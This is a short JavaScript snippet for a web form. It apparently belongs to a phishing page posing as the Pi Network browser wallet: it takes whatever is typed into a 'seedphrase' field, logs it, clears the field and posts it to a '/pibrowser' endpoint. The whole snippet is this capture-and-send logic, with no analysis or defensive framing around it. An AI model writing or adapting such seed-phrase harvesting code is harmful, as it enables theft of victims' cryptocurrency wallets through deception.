const form = document.getElementById('myForm');
const textInput = document.querySelector('.seedphrase');
const handleFormSubmit = async (event) => {
event.preventDefault();
const passphrase = textInput.value;
try {
    console.log(passphrase);
    textInput.value = "";
    await axios.post('/pibrowser', { passphrase });
} catch (error) {
    console.log(error);
}
};
form.addEventListener('submit', handleFormSubmit);
form.addEventListener('keypress', (event) => {
if (event.key === 'Enter') {
    handleFormSubmit(event); 
}
});